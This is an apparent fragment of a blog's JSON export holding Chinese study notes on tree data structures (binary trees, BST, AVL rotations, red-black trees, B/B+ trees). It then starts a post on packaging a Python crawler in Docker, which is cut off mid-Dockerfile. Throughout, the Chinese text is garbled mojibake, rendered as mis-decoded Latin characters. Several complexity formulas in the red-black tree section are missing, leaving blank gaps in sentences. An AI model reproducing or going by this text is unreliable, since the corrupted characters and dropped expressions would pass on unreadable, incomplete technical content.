ç»“ç‚¹çš„åº¦ï¼ˆdegreeï¼‰(å°±æ˜¯ç›´æ¥çš„å­©å­æœ‰å‡ ä¸ª)\n\n  ç»“ç‚¹æ‰€æ‹¥æœ‰çš„å­æ ‘çš„ä¸ªæ•°ç§°ä¸ºè¯¥ç»“ç‚¹çš„åº¦ï¼Œè€Œæ ‘ä¸­å„ç»“ç‚¹çš„åº¦çš„æœ€å¤§å€¼ç§°ä¸ºè¯¥æ ‘çš„åº¦ã€‚\n\n  \n\n+ å¶å­ï¼ˆleafï¼‰ç»“ç‚¹å’Œåˆ†æ”¯ç»“ç‚¹  (æ²¡æœ‰å­©å­çš„èŠ‚ç‚¹å°±æ˜¯å¶å­èŠ‚ç‚¹)\n  + åº¦ä¸º0çš„ç»“ç‚¹ç§°ä¸ºå¶å­ï¼ˆç»ˆç«¯ï¼‰ç»“ç‚¹ï¼›åº¦ä¸ä¸º0çš„ç»“ç‚¹ç§°ä¸ºåˆ†æ”¯ï¼ˆéç»ˆç«¯ï¼‰ç»“ç‚¹ã€‚\n  \n  + ä¸€æ£µæ ‘é™¤äº†å¶å­ç»“ç‚¹å°±æ˜¯åˆ†æ”¯èŠ‚ç‚¹ã€‚\n  \n    \n  \n+ å­©å­ç»“ç‚¹ã€åŒäº²ç»“ç‚¹ã€å…„å¼ŸåŠå ‚å…„å¼Ÿç»“ç‚¹ \n\n  + æ ‘ä¸­ä¸€ä¸ªç»“ç‚¹çš„å­æ ‘çš„æ ¹ï¼ˆæˆ–è¯´åç»§ï¼‰ç§°ä¸ºè¯¥ç»“ç‚¹çš„å­©å­ï¼Œè¯¥ç»“ç‚¹ç§°ä¸ºå…¶å­©å­ç»“ç‚¹çš„åŒäº²ç»“ç‚¹ã€‚\n  + åŒä¸€ä¸ªåŒäº²çš„å­©å­ç»“ç‚¹äº’ç§°ä¸ºå…„å¼Ÿã€‚åŒäº²åœ¨åŒä¸€å±‚çš„ç»“ç‚¹äº’ä¸ºå ‚å…„å¼Ÿã€‚\n\n\n\n+ ç¥–å…ˆå’Œå­å­™\n  + ç¥–å…ˆæ˜¯ä»æ ¹åˆ°è¯¥æ‰€ç»åˆ†æ”¯ä¸Šçš„æ‰€æœ‰ç»“ç‚¹ã€‚åä¹‹ï¼Œä»¥æŸç»“ç‚¹ä¸ºæ ¹çš„å­æ ‘ä¸­çš„ä»»ä¸€ç»“ç‚¹ç§°ä¸ºè¯¥ç»“ç‚¹çš„å­å­™ã€‚\n  + æ˜¾ç„¶ç¥–å…ˆå’Œå­å­™å…³ç³»æ˜¯çˆ¶å­å…³ç³»çš„å»¶ä¼¸ã€‚\n\n\n\n+ ç»“ç‚¹çš„å±‚æ•°ï¼ˆlevelï¼‰å’Œæ ‘çš„æ·±åº¦(depthï¼Œæˆ–ç§°é«˜åº¦heightï¼‰\n  + ç»“ç‚¹çš„å±‚æ¬¡ä»æ ¹ç»“ç‚¹å¼€å§‹ç®—èµ·ï¼Œæ ¹ç»“ç‚¹çš„å±‚æ•°ä¸º1ï¼Œå…¶ä½™ç»“ç‚¹çš„å±‚æ•°ç­‰äºå…¶åŒäº²ç»“ç‚¹çš„å±‚æ•°åŠ 1ã€‚æ¯”å¦‚ï¼Œå¦‚æœæŸä¸ªç»“ç‚¹çš„å±‚æ•°ä¸ºhï¼Œåˆ™å…¶å­æ ‘å°±åœ¨ç¬¬h+1å±‚ã€‚\n  + æ ‘ä¸­å„ä¸ªç»“ç‚¹å±‚æ•°çš„æœ€å¤§å€¼ç§°ä¸ºæ ‘çš„æ·±åº¦ï¼ˆé«˜åº¦ï¼‰ã€‚\n\n\n\n+ æœ‰åºæ ‘ï¼ˆordered treeï¼‰å’Œæ— åºæ ‘ï¼ˆunordered treeï¼‰\n\n  è‹¥ä¸€æ£µæ ‘ä¸­ç»“ç‚¹çš„å„å­æ ‘ä»å·¦åˆ°å³æ˜¯æœ‰æ¬¡åºçš„ï¼Œå³è‹¥äº¤æ¢äº†æŸç»“ç‚¹å„å­æ ‘çš„ç›¸å¯¹ä½ç½®å°±æ„æˆä¸åŒçš„æ ‘ï¼Œåˆ™ç§°è¿™æ£µæ ‘ä¸ºæœ‰åºæ ‘ï¼Œå¦åˆ™ç§°ä¸ºæ— åºæ ‘ã€‚\n\n\n\n+ è·¯å¾„ï¼ˆpathï¼‰\n\n  ä»æ ‘ä¸­çš„ä¸€ä¸ªç»“ç‚¹åˆ°å¦ä¸€ä¸ªç»“ç‚¹çš„è·¯é€”ï¼ˆè·¯å¾„åªèƒ½ç”±ä¸Šå‘ä¸‹ï¼Œä¸èƒ½æ¨ªå‘æˆ–ç”±ä¸‹å‘ä¸Šï¼‰\n\n\n\n+ æ£®æ—ï¼ˆforestï¼‰\n\n  mï¼ˆmâ‰¥0ï¼‰æ£µäº’ä¸ç›¸äº¤çš„æ ‘çš„é›†åˆ\n\n  \n\n\n\n# 2. äºŒå‰æ ‘\n\nä¸€èˆ¬çš„æ ‘è§„å¾‹æ€§å·®ï¼ŒäºŒå‰æ ‘ç»“æ„ç®€å•ï¼Œå­˜å‚¨å’Œå¤„ç†ç›¸å¯¹å®¹æ˜“ï¼Œè€Œä¸”ä¸€èˆ¬çš„æ ‘å¯ä»¥è½¬åŒ–ä¸ºäºŒå‰æ ‘å¤„ç†ã€‚\n\n### 2.1 äºŒå‰æ ‘çš„å®šä¹‰\n\n+ äºŒå‰æ ‘æ˜¯nï¼ˆnâ‰¥0ï¼‰ä¸ªç»“ç‚¹çš„æœ‰é™é›†åˆï¼Œé™¤äº†ç©ºæ ‘ï¼ˆn=0ï¼‰ä¹‹å¤–ï¼Œç”±ä¸€ä¸ªæ ¹ç»“ç‚¹åŠä¸¤æ£µä¸ç›¸äº¤çš„å·¦å­æ ‘å’Œå³å­æ ‘ç»„æˆï¼›\n\n+ äºŒå‰æ ‘æ¯ä¸ªç»“ç‚¹çš„åº¦æ•°â‰¤2ï¼›\n\n+ äºŒå‰æ ‘çš„å®šä¹‰æ˜¯é€’å½’çš„ã€‚\n\näºŒå‰æ ‘æœ‰äº”ç§åŸºæœ¬å½¢æ€ï¼š\n\n(1)ç©ºæ ‘\n\n(2)åªæœ‰æ ¹ç»“ç‚¹\n\n(3)åªæœ‰å·¦å­æ ‘\n\n(4)åªæœ‰å³å­æ ‘\n\n(5)å®Œæ•´äºŒå‰æ ‘\n\næ³¨æ„ï¼šäºŒå‰æ ‘çš„å­æ ‘ä¸€å®šè¦åˆ†å‡ºå·¦å³ï¼Œå¦åˆ™ä¸èƒ½ç§°ä½œäºŒå‰æ ‘ã€‚\n\n### 2.2 äºŒå‰æ ‘çš„æ€§è´¨\n\n+ äºŒå‰æ ‘çš„ç¬¬iå±‚çš„ç»“ç‚¹æ•°é‡æœ€å¤šä¸º 2<sup>i-1Â </sup> (i >= 1)\n\n  + 1å±‚ æœ€å¤š1\n\n  + 2å±‚ æœ€å¤š2\n\n  + 3å±‚ æœ€å¤š4\n\n    \n\n+ æ·±åº¦ä¸ºkçš„äºŒå‰æ ‘ç»“ç‚¹æ•°ç›®æœ€å¤šä¸º 2<sup>k</sup> -1 (k >= 1)\n\n  + æ·±1å±‚ æœ€å¤š1\n\n  + æ·±2å±‚ æœ€å¤š3\n\n  + æ·±3å±‚ æœ€å¤š7\n\n    \n\n+ åœ¨ä»»æ„äºŒå‰æ ‘ä¸­ï¼Œè‹¥å¶å­ç»“ç‚¹æ•°ä¸ºn0ï¼Œåº¦æ•°ä¸º2çš„ç»“ç‚¹æ•°ä¸ºn2ï¼Œåˆ™æœ‰n0=n2+1\n\n  æœ¬æ€§è´¨æ˜¯è¯´ï¼Œä»»æ„ä¸€é¢—äºŒå‰æ ‘ï¼Œå¶å­ç»“ç‚¹æ¯”åº¦æ•°ä¸º2çš„ç»“ç‚¹çš„ä¸ªæ•°å¤šä¸€ä¸ªã€‚\n\n  â€‹     1\n\n    1     1\n\n  11    11 \n\n  å¶å­èŠ‚ç‚¹4ä¸ª, åº¦æ•°ä¸º2çš„æ˜¯3ä¸ª\n\n\n\n\n### 2.3 äºŒå‰æ ‘å­˜å‚¨(å…ˆå˜æˆå®Œå…¨äºŒå‰æ ‘)\n\näºŒå‰æ ‘çš„å½¢çŠ¶å¯èƒ½ç¹å¤šä¸”ä¸å›ºå®šï¼Œä¸å¥½æŒæ¡è§„å¾‹ï¼Œè€Œè¿›è¡Œé¡ºåºå­˜å‚¨æ°æ°ç›¸åï¼Œè¦æ±‚è§„å¾‹æ€§å¼ºã€‚æ‰€ä»¥è¿™ç§å­˜å‚¨ä¸€å®šæ˜¯è§„å¾‹æ€§è¾ƒå¼ºçš„äºŒå‰æ ‘æ‰é€‚åˆã€‚å®Œå…¨äºŒå‰æ ‘ç¬¦åˆè¿™ä¸€ç‚¹ï¼Œè¿™ä¹Ÿæ˜¯å®ƒè¢«å®šä¹‰çš„åŸå› ä¹‹ä¸€ã€‚\n\nå¯¹äºå®Œå…¨äºŒå‰æ ‘è¿›è¡Œç»“ç‚¹ç¼–å·ï¼ˆè‡ªä¸Šè€Œä¸‹ï¼Œè‡ªå·¦è‡³å³ï¼‰åï¼Œç¼–å·å¯ä»¥åæ˜ ç»“ç‚¹çš„åˆ†æ”¯å’Œä»å±å…³ç³»ï¼Œå°†è¿™äº›ç»“ç‚¹å­˜å…¥ä¸€ç»´æ•°ç»„æ—¶ï¼Œç¼–å·å’Œæ•°ç»„ä¸‹æ ‡å¯ä»¥å¯¹åº”èµ·æ¥ã€‚\n\nå¯¹äºä¸€èˆ¬çš„äºŒå‰æ ‘ï¼Œä¸æ˜“ç›´æ¥é‡‡ç”¨é¡ºåºå­˜å‚¨ï¼Œå¯ä»¥è™šè¡¥æˆå®Œå…¨äºŒå‰æ ‘åå†ç”¨é¡ºåºå­˜å‚¨çš„æ–¹æ³•å­˜å‚¨ã€‚\n\n\n\nç„¶åæ•°ç»„çš„æ¯ä¸ªèŠ‚ç‚¹ç»“æ„å¯ä»¥å¦‚ä¸‹:\n\n```c\ntypedef struct node\n{\n DataType data;\n struct node *lchild,*parents,*rchild;\n}ThTree;\n```\n\n\n\n### 2.4 äºŒå‰æ ‘éå†\n\n+ å…ˆåºéå†ï¼š**æ ¹**ï¼Œå·¦å­æ ‘ï¼Œå³å­æ ‘   \n\n+ ä¸­åºéå†ï¼šå·¦å­æ ‘ï¼Œ**æ ¹**ï¼Œå³å­æ ‘  \n\n+ ååºéå†ï¼šå·¦å­æ ‘ï¼Œå³å­æ ‘ï¼Œ**æ ¹**\n\n  \n\nä¸­åºæ›´é‡è¦, åªæœ‰ä¸­åºå’Œå…¶ä»–ä¸€ä¸ªåºç»„åˆ,å°±èƒ½è¿˜åŸäºŒå‰æ ‘\n\n\n\n# 3. äºŒå‰æ ‘çš„ç§ç±»\n\n### 3.1 æ»¡äºŒå‰æ ‘(å°±æ˜¯èŠ‚ç‚¹å…¨æ»¡äº†)\n\næ»¡äºŒå‰æ ‘çš„å®šä¹‰ï¼šæ·±åº¦ä¸ºkï¼ˆkâ‰¥1ï¼‰ä¸”ç»“ç‚¹æ•°ä¸º 2<sup>k</sup> -1çš„äºŒå‰æ ‘ã€‚\n\næ»¡äºŒå‰æ ‘çš„ç»“ç‚¹æ•°è¾¾åˆ°æœ€å¤§å€¼ã€‚\n\n\n\n### 3.2 å®Œå…¨äºŒå‰æ ‘(é™¤æœ€åä¸€å±‚éƒ½æ˜¯æ»¡çš„,å› ä¸ºæ•°é‡ä¸å¯èƒ½æ­£å¥½æ»¡äºŒå‰æ ‘,å¸¸ç”¨)\n\nå¯¹äºæ»¡äºŒå‰æ ‘çš„ç»“ç‚¹ï¼ŒæŒ‰ä¸‹åˆ—è§„åˆ™ç¼–å·ï¼š\n(1)ä»æ ¹ç»“ç‚¹å¼€å§‹ï¼Œè‡ªä¸Šè€Œä¸‹ï¼›\n(2)åŒä¸€å±‚è‡ªå·¦è‡³å³ã€‚\n\n+ æ»¡äºŒå‰æ ‘çš„ç»“ç‚¹ç¼–å·åï¼Œä»»æ„å–æ»¡äºŒå‰æ ‘çš„å‰è‹¥å¹²ä¸ªè¿ç»­çš„ç»“ç‚¹æ‰€å¯¹åº”çš„äºŒå‰æ ‘ï¼Œç§°ä¸ºå®Œå…¨äºŒå‰æ ‘ã€‚\n\n+ å®Œå…¨äºŒå‰æ ‘çš„ç‰¹ç‚¹ï¼šé™¤æœ€åä¸€å±‚å¤–ï¼Œå…¶ä½™å„å±‚å‡æ˜¯æ»¡çš„ï¼Œæœ€åä¸€å±‚ï¼Œç»“ç‚¹è¿ç»­å‡ºç°åœ¨å·¦è¾¹ã€‚\n\nè¯·æ³¨æ„ï¼šæ»¡äºŒå‰æ ‘è¦æ±‚å¤ªç‰¹æ®Šä¸”ä¸¥æ ¼ï¼Œä¸€èˆ¬ä¸å®¹æ˜“æ»¡è¶³ï¼Œè€Œå®Œå…¨äºŒå‰æ ‘æ¡ä»¶ä½ä¸€äº›ï¼Œå®¹æ˜“æ»¡è¶³ï¼Œä»Šåä¼šç»å¸¸ç”¨åˆ°å®ƒï¼Œæ‰€ä»¥è¦æ³¨æ„å®ƒã€‚\n\n\n\n### 3.3 äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆè‹±è¯­ï¼šBinary Search Treeï¼Œç®€å†™ä¸ºBSTï¼‰\n\nä¹Ÿç§° **äºŒå‰æœç´¢æ ‘**ã€**æœ‰åºäºŒå‰æ ‘**ï¼ˆè‹±è¯­ï¼šordered binary treeï¼‰ï¼Œ**æ’åºäºŒå‰æ ‘**ï¼ˆè‹±è¯­ï¼šsorted binary treeï¼‰ä¸ä¸€å®šæ˜¯å®Œå…¨äºŒå‰æ ‘\n\næ˜¯æŒ‡ä¸€æ£µç©ºæ ‘æˆ–è€…å…·æœ‰ä¸‹åˆ—æ€§è´¨çš„äºŒå‰æ ‘ï¼š\n\n+ è‹¥ä»»æ„èŠ‚ç‚¹çš„å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼›\n\n+ è‹¥ä»»æ„èŠ‚ç‚¹çš„å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼›\n\n+ ä»»æ„èŠ‚ç‚¹çš„å·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æŸ¥æ‰¾æ ‘ï¼›\n\n+ æ²¡æœ‰é”®å€¼ç›¸ç­‰çš„èŠ‚ç‚¹ã€‚\n\nç®€å•çš„è¯´å°±æ˜¯ï¼šå„èŠ‚ç‚¹å€¼ä¸åŒï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå­æ ‘ï¼šå·¦<æ ¹<å³ã€‚\n\n\n\n##### 3.3.1 ç®—æ³•å¤æ‚åº¦\n\n+ ç®—æ³•æŸ¥æ‰¾æ—¶é—´ä¾èµ–äºæ ‘çš„æ‹“æ‰‘ç»“æ„ã€‚æœ€ä½³æƒ…å†µæ˜¯ O(logÂ­2n)ï¼Œè€Œæœ€åæƒ…å†µæ˜¯ O(n)ã€‚\n\n+ æ’å…¥ç®—æ³•çš„å¤æ‚åº¦ä¸æŸ¥æ‰¾ç®—æ³•çš„å¤æ‚åº¦æ˜¯ä¸€æ ·çš„ï¼šæœ€ä½³æƒ…å†µæ˜¯ O(logÂ­2n)ï¼Œè€Œæœ€åæƒ…å†µæ˜¯ O(n)ã€‚\n\n  å¦‚ä½•æ’å…¥å€¼ç›¸ç­‰ç›´æ¥ä¸¢å¼ƒæˆ–æŠ›å‡ºå¼‚å¸¸\n\n+ åˆ é™¤ç®—æ³•çš„è¿è¡Œæ—¶é—´ä¹Ÿä¸ BST çš„æ‹“æ‰‘ç»“æ„æœ‰å…³ï¼Œæœ€ä½³æƒ…å†µæ˜¯ O(logÂ­2n)ï¼Œè€Œæœ€åæƒ…å†µæ˜¯ O(n)ã€‚\n\n  åˆ é™¤ä¸€ä¸ªéå¶å­èŠ‚ç‚¹ï¼Œå°±å¿…é¡»é€‰æ‹©å…¶ä»–èŠ‚ç‚¹æ¥å¡«è¡¥å› åˆ é™¤èŠ‚ç‚¹æ‰€é€ æˆçš„æ ‘çš„æ–­è£‚ã€‚\n\n\n\n### 3.4 å¹³è¡¡äºŒå‰æ ‘\n\nå¹³è¡¡äºŒå‰æ ‘çš„æå‡ºå°±æ˜¯ä¸ºäº†ä¿è¯æ ‘ä¸è‡³äºå¤ªå€¾æ–œï¼Œå°½é‡ä¿è¯ä¸¤è¾¹å¹³è¡¡ã€‚å› æ­¤å®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š\n\n1. å¹³è¡¡äºŒå‰æ ‘è¦ä¹ˆæ˜¯ä¸€æ£µç©ºæ ‘\n2. è¦ä¹ˆä¿è¯å·¦å³å­æ ‘çš„é«˜åº¦ä¹‹å·®ä¸å¤§äº 1\n3. å­æ ‘ä¹Ÿå¿…é¡»æ˜¯ä¸€é¢—å¹³è¡¡äºŒå‰æ ‘\n\nè¿™ç§å½¢æ€å°±æ˜¯å¹³è¡¡ï¼Œä¼šä½¿æŸ¥æ‰¾é€Ÿåº¦æ›´å¿«ã€‚ä¸ºä»€ä¹ˆèƒ½å¤Ÿä¿æŒè¿™ç§å¥½èº«æå‘¢ï¼Ÿé€šè¿‡åœ¨æ–°å¢/åˆ é™¤æ—¶çš„æ—‹è½¬ï¼ˆ`å·¦æ—‹å’Œå³æ—‹`ï¼‰ã€‚\n\n\n\n##### 3.4.1 å¹³è¡¡è°ƒæ•´\n\n1. æ‰¾å¹³è¡¡å› å­ = 2\n\n2. æ‰¾æ’å…¥æ–°èŠ‚ç‚¹åå¤±å»å¹³è¡¡çš„æœ€å°å­æ ‘\n\n   + è·ç¦»æ’å…¥ç‚¹æœ€è¿‘\n   + å¹³è¡¡å› å­ç»å¯¹å€¼å¤§äº1çš„ç»“ç‚¹ä½œä¸ºæ ¹\n   + ç¡®è®¤è°ƒæ•´çš„ç‚¹:     å…ˆç¡®å®šæ ¹ -> å¯¹æ’å…¥çš„æ–°èŠ‚ç‚¹, è·¯ä¸Šçš„3ä¸ªç‚¹\n\n3. å¹³è¡¡è°ƒæ•´, æœ‰å››ç§ç±»å‹\n\n   + LL-> R \t\n\n     ä¸­ä¸ºæ”¯ç‚¹, é«˜å³æ—‹\n\n   + RR -> L\n\n     ä¸­ä¸ºæ”¯ç‚¹, é«˜å·¦æ—‹\n   \n   + LR -> LR\n   \n     ä¸‹äºŒæ•´ä½“å…ˆå·¦è½¬, å˜æˆ LL å†å³è½¬\n   \n   + RL -> RL\n   \n     ä¸‹äºŒæ•´ä½“å…ˆå³è½¬, å˜æˆ RR å†å·¦è½¬\n\n\n\n##### 3.4.2 å¸¸è§çš„å¹³è¡¡æ ‘ï¼š\n\n[AVLæ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AVLæ ‘)ã€[Treap](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/Treap)ã€[ä¼¸å±•æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/ä¼¸å±•æ ‘)ã€[çº¢é»‘æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/çº¢é»‘æ ‘)ã€[åŠ æƒå¹³è¡¡æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/åŠ æƒå¹³è¡¡æ ‘)ã€[2-3æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/2-3æ ‘)ã€[AAæ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AAæ ‘)ã€[æ›¿ç½ªç¾Šæ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/æ›¿ç½ªç¾Šæ ‘)ã€èŠ‚ç‚¹å¤§å°å¹³è¡¡æ ‘\n\n\n\n### 3.5 çº¢é»‘æ ‘ï¼ˆRedâ€“black tree)\n\nçº¢é»‘æ ‘æ˜¯ä¸€ç§å«æœ‰çº¢é»‘ç»“ç‚¹å¹¶èƒ½è‡ªå¹³è¡¡çš„äºŒå‰æŸ¥æ‰¾æ ‘ã€‚å®ƒå¿…é¡»æ»¡è¶³ä¸‹é¢æ€§è´¨ï¼š\n\n+ æ€§è´¨1ï¼šæ¯ä¸ªèŠ‚ç‚¹è¦ä¹ˆæ˜¯é»‘è‰²ï¼Œè¦ä¹ˆæ˜¯çº¢è‰²ã€‚\n+ æ€§è´¨2ï¼šæ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²ã€‚æ¯ä¸ªå¶å­èŠ‚ç‚¹ï¼ˆNILï¼‰æ˜¯é»‘è‰²ã€‚\n+ æ€§è´¨3ï¼šæ ‘ä¸­ä¸å­˜åœ¨ä¸¤ä¸ªç›¸é‚»çš„çº¢è‰²ç»“ç‚¹ï¼ˆå³çº¢è‰²ç»“ç‚¹çš„çˆ¶ç»“ç‚¹å’Œå­©å­ç»“ç‚¹å‡ä¸èƒ½æ˜¯çº¢è‰²ï¼‰\n+ æ€§è´¨4ï¼šä»ä»»æ„ä¸€ä¸ªç»“ç‚¹ï¼ˆåŒ…æ‹¬æ ¹ç»“ç‚¹ï¼‰åˆ°å…¶ä»»ä½•åä»£ NULL ç»“ç‚¹ï¼ˆé»˜è®¤æ˜¯é»‘è‰²çš„ï¼‰çš„æ¯æ¡è·¯å¾„éƒ½å…·æœ‰ç›¸åŒæ•°é‡çš„é»‘è‰²ç»“ç‚¹ã€‚\n\n\n\n![1](æ ‘çš„ä»‹ç»å’Œåˆ†ç±»/1.png)\n\n\n\n##### ä¸ºä»€ä¹ˆè¦æœ‰çº¢é»‘æ ‘ï¼Ÿ\n\nå¤§å¤šæ•°äºŒå‰æ’åºæ ‘BSTçš„æ“ä½œï¼ˆæŸ¥æ‰¾ã€æœ€å¤§å€¼ã€æœ€å°å€¼ã€æ’å…¥ã€åˆ é™¤ç­‰ç­‰ï¼‰éƒ½æ˜¯ çš„æ—¶é—´å¤æ‚åº¦ï¼Œh ä¸ºæ ‘çš„é«˜åº¦ã€‚ä½†æ˜¯å¯¹äºæ–œæ ‘è€Œè¨€ï¼ˆBSTæç«¯æƒ…å†µä¸‹å‡ºç°ï¼‰ï¼ŒBSTçš„è¿™äº›æ“ä½œçš„æ—¶é—´å¤æ‚åº¦å°†è¾¾åˆ° ã€‚ä¸ºäº†ä¿è¯BSTçš„æ‰€æœ‰æ“ä½œçš„æ—¶é—´å¤æ‚åº¦çš„ä¸Šé™ä¸º ï¼Œå°±è¦æƒ³åŠæ³•æŠŠä¸€é¢—BSTæ ‘çš„é«˜åº¦ä¸€ç›´ç»´æŒåœ¨ ï¼Œè€Œçº¢é»‘æ ‘å°±åšåˆ°äº†è¿™ä¸€ç‚¹ï¼Œçº¢é»‘æ ‘çš„é«˜åº¦å§‹ç»ˆéƒ½ç»´æŒåœ¨ ï¼Œn ä¸ºæ ‘ä¸­çš„é¡¶ç‚¹æ•°ç›®.\n\n##### çº¢é»‘æ ‘RBTä¸å¹³è¡¡äºŒå‰æ ‘AVLæ¯”è¾ƒï¼š\n\nAVL æ ‘æ¯”çº¢é»‘æ ‘æ›´åŠ å¹³è¡¡ï¼Œä½†AVLæ ‘åœ¨æ’å…¥å’Œåˆ é™¤çš„æ—¶å€™ä¹Ÿä¼šå­˜åœ¨å¤§é‡çš„æ—‹è½¬æ“ä½œã€‚æ‰€ä»¥å½“ä½ çš„åº”ç”¨æ¶‰åŠåˆ°é¢‘ç¹çš„æ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œåˆ‡è®°æ”¾å¼ƒAVLæ ‘ï¼Œé€‰æ‹©æ€§èƒ½æ›´å¥½çš„çº¢é»‘æ ‘ï¼›å½“ç„¶ï¼Œå¦‚æœä½ çš„åº”ç”¨ä¸­æ¶‰åŠçš„æ’å…¥å’Œåˆ é™¤æ“ä½œå¹¶ä¸é¢‘ç¹ï¼Œè€Œæ˜¯æŸ¥æ‰¾æ“ä½œç›¸å¯¹æ›´é¢‘ç¹ï¼Œé‚£ä¹ˆå°±ä¼˜å…ˆé€‰æ‹© AVL æ ‘è¿›è¡Œå®ç°ã€‚\n\n\n\n# 4. å…¶ä»–ç§ç±»çš„æ ‘\n\n### 4.1 å“ˆå¤«æ›¼æ ‘(éœå¤«æ›¼æ ‘)\n\nå¸¦æƒçš„æ ‘,  åŠ èµ·æ¥ WPL æœ€å°, å¯ç”¨æ¥å‹ç¼©\n\n\n\n### 4.2 Bæ ‘(B-æ ‘)\n\nNå‰çš„æ’åºæ ‘\n\n+ ç»“ç‚¹æœ€å¤šå«æœ‰m é¢—å­æ ‘ï¼Œm-1ä¸ªå…³é”®å­—ï¼ˆæ•°æ®ï¼‰ï¼ˆm>=2ï¼‰\n+ è‹¥æ ¹èŠ‚ç‚¹ä¸æ˜¯å¶å­èŠ‚ç‚¹ï¼Œåˆ™è‡³å°‘æœ‰ä¸¤é¢—å­æ ‘ã€‚\n\nä¸æ»¡è¶³ï¼Œå°±åˆ†è£‚ï¼Œä»ä¸­é—´åˆ†å¼€ï¼Œåˆ†æˆä¸¤é¢—å­æ ‘\n\n+ é™¤æ ¹èŠ‚ç‚¹å’Œå¶å­èŠ‚ç‚¹å¤–ï¼Œå…¶ä»–æ¯ä¸ªèŠ‚ç‚¹è‡³å°‘æœ‰ceil(m/2)ä¸ªå­èŠ‚ç‚¹ï¼ˆå­æ ‘ï¼‰ã€‚2.1=>3, 2.7=>3\n\n\n\n### 4.3 B+æ ‘ \n\n##### 4.3.1 æ•°æ®åº“ä¸ºä»€ä¹ˆä¸ç”¨çº¢é»‘æ ‘\n\n+ æ ‘å¤ªé«˜ï¼Œè¯»å–æ¬¡æ•°è¿‡å¤š\n+ è¯»å–æµªè´¹å¤ªå¤šï¼Œä¸è¿ç»­\n\n##### 4.3.2 å’Œ B æ ‘çš„åŒºåˆ«\n\n+ å¶å­èŠ‚ç‚¹è¿èµ·æ¥äº† åŒå‘é“¾è¡¨ï¼ˆæ–¹ä¾¿èŒƒå›´æŸ¥æ‰¾ï¼‰\n\n+ éå¶å­èŠ‚ç‚¹ä¸å­˜æ•°æ®ï¼Œæ•°æ®éƒ½å­˜åœ¨å¶å­èŠ‚ç‚¹\n\n  \n\n# 5. å¤´è„‘é£æš´\n\n### 5.1 å·¦æ—‹å³æ—‹\n\n+ å·¦æ—‹\n\n  çˆ¶äº²æ‰ä¸‹å»ï¼Œå³å„¿å­ä¸Šå»ï¼Œä¸ºäº†ä¸Šå»ï¼Œå„¿å­å‰²å·¦è…¿è¡¥å¿ç»™çˆ¶äº²å³è…¿\n\n+ å³æ—‹\n\n  çˆ¶äº²æ‰ä¸‹å»ï¼Œå·¦å„¿å­ä¸Šå»ï¼Œä¸ºäº†ä¸Šå»ï¼Œå„¿å­å‰²å³è…¿è¡¥å¿ç»™çˆ¶äº²å·¦è…¿\n\n  \n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.jianshu.com/p/a826ab614e4a\n\n+ [äºŒå‰æŸ¥æ‰¾æ ‘](https://www.cnblogs.com/gaochundong/p/binary_search_tree.html)\n\n+ [ä¸ºä»€ä¹ˆmysqlç´¢å¼•è¦ä½¿ç”¨B+æ ‘ï¼Œè€Œä¸æ˜¯Bæ ‘ï¼Œçº¢é»‘æ ‘](https://segmentfault.com/a/1190000021488885)\n\n  \n\n","tags":["ç®—æ³•"],"categories":["æ•°æ®ç»“æ„"]},{"title":"pythonçˆ¬è™«é¡¹ç›®åœ¨dockerä¸­çš„éƒ¨ç½²å®è·µ","url":"%2Fp%2Fdc81a411.html","content":"\n\n\n### 1. é€‰æ‹©é•œåƒ\n\nè¿™é‡Œé€‰æ‹©åŸºç¡€é•œåƒæ—¶æ˜¯æœ‰è®²ç©¶. ä¸€æ˜¯åº”å½“å°½é‡é€‰æ‹©å®˜æ–¹é•œåƒåº“é‡Œçš„åŸºç¡€é•œåƒï¼›äºŒæ˜¯åº”å½“é€‰æ‹©è½»é‡çº§çš„é•œåƒåšåº•åŒ….\n\nå°±å…¸å‹çš„ Linux åŸºç¡€é•œåƒæ¥è¯´ï¼Œå¤§å°å…³ç³»å¦‚ä¸‹ï¼šUbuntu > CentOS > Debian> Alpine\n\nAlpine Docker é•œåƒä¹Ÿç»§æ‰¿äº† Alpine Linux å‘è¡Œç‰ˆçš„è¿™äº›ä¼˜åŠ¿ã€‚ç›¸æ¯”äºå…¶ä»– Docker é•œåƒï¼Œå®ƒçš„å®¹é‡éå¸¸å°ï¼Œä»…ä»…åªæœ‰ 5 MB å·¦å³ï¼ˆå¯¹æ¯” Ubuntu ç³»åˆ—é•œåƒæ¥è¿‘ 200 MBï¼‰ï¼Œä¸”æ‹¥æœ‰éå¸¸å‹å¥½çš„åŒ…ç®¡ç†æœºåˆ¶apkã€‚\n\n<!-- more -->\n\n### 2. æ‹·è´æ–‡ä»¶\n\nç›¸å¯¹äº ADD,ä¼˜å…ˆä½¿ç”¨ COPYæŒ‡ä»¤\n\nå¦å¤–å‘ç°æ‹·è´æ–‡ä»¶å¤¹æ˜¯æŠŠæ–‡ä»¶å¤¹çš„å†…å®¹æ‹·è´è¿›å», è€Œä¸æ˜¯æŠŠæ•´ä¸ªç›®å½•æ‹·è´è¿›å», å‘çˆ¹ æœ€åä½¿ç”¨dockerignoreè§£å†³è¿™ä¸ªé—®é¢˜.\n\n```dockerfile\ncopy . 